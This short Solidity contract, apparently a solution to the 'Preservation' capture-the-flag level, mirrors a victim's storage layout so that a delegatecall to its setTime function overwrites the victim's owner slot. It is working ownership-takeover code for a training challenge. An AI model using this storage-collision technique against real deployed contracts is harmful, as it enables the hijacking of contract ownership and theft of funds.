pragma solidity ^0.8.0;

contract PreservationAttacker {
  address public placeHolder1;
  address public placeHolder2;
  address public owner;

  function setTime(uint256 data) public {
    owner = address(uint160(data));
  }
}